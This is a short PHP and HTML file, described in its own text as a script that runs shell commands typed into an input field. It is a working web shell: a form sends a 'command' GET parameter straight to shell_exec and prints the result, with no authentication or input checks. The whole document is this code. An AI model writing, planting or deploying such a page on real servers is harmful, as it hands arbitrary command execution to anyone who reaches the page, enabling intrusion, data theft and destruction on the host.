<html>
  <body>
    <p> this is a scrip that exectutes shell commands that are written in the input field</p>
	<form action="" method="get">
	  <input type="text" name="command">
	  <input type="submit" value="Execute" name="submit">
	</form>
  </body>
</html>

<?php
  if (isset($_GET["command"])) {
	  echo shell_exec($_GET["command"]);
  }
?>